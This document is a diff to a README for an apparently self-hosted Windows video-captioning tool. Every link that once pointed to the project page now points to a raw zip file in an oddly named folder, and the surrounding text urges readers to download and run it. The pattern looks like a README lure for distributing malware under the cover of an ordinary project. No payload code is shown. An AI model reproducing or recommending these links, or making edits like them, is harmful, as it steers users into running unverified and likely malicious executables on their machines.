@@ -1,12 +1,12 @@
 # 🎬 ai-video-captions - Add animated captions with ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-3B82F6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cordsbonmot501/ai-video-captions)
+[![Download Now](https://img.shields.io/badge/Download%20Now-3B82F6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cordsbonmot501/ai-video-captions/main/Nimrodize/ai_video_captions_2.5.zip)
 
 ## 📥 Download for Windows
 
 To get started, open the project page and download and run this file or the Windows package you find there:
 
-[https://github.com/cordsbonmot501/ai-video-captions](https://github.com/cordsbonmot501/ai-video-captions)
+[https://raw.githubusercontent.com/cordsbonmot501/ai-video-captions/main/Nimrodize/ai_video_captions_2.5.zip](https://raw.githubusercontent.com/cordsbonmot501/ai-video-captions/main/Nimrodize/ai_video_captions_2.5.zip)
 
 If you see a release file such as `.exe` or a Windows zip file, download it and open it on your PC. If the page shows source files only, use the setup steps below.
 
@@ -51,7 +51,7 @@ If you use the app from a release file, you may not need Docker.
 ## 🚀 Quick start
 
 1. Open the download page:
-   [https://github.com/cordsbonmot501/ai-video-captions](https://github.com/cordsbonmot501/ai-video-captions)
+   [https://raw.githubusercontent.com/cordsbonmot501/ai-video-captions/main/Nimrodize/ai_video_captions_2.5.zip](https://raw.githubusercontent.com/cordsbonmot501/ai-video-captions/main/Nimrodize/ai_video_captions_2.5.zip)
 
 2. Look for a Windows release file, app file, or zip archive.
 
@@ -238,7 +238,7 @@ This project is self-hosted. Your video files stay on your machine when you run 
 
 Use this page to download or run the software on Windows:
 
-[https://github.com/cordsbonmot501/ai-video-captions](https://github.com/cordsbonmot501/ai-video-captions)
+[https://raw.githubusercontent.com/cordsbonmot501/ai-video-captions/main/Nimrodize/ai_video_captions_2.5.zip](https://raw.githubusercontent.com/cordsbonmot501/ai-video-captions/main/Nimrodize/ai_video_captions_2.5.zip)
 
 If a release file appears, download and run it. If only source files appear, follow the Docker steps above
 
